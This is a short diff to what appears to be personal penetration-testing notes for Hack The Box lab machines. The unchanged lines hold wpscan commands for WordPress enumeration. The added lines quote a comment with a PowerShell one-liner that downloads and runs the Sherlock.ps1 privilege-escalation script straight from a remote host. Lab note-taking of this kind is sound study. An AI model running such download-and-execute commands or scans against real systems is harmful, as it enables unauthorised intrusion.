@@ -348,3 +348,8 @@ Wordpress scanning:
 wpscan --url https://brainfuck.htb --disable-tls-checks --api-token
 wpscan --url https://brainfuck.htb --enumerate p --disable-tls-check
 
+From htb optimum walkthrough comment section:
+Thanks for bringing Sherlock back!  :D
+
+I tend to do something like:  `iex ((new-object net.webclient).downloadstring("http://x.x.x.x/Sherlock.ps1")); Find-AllVulns`.  Saves having to mod the script.
+
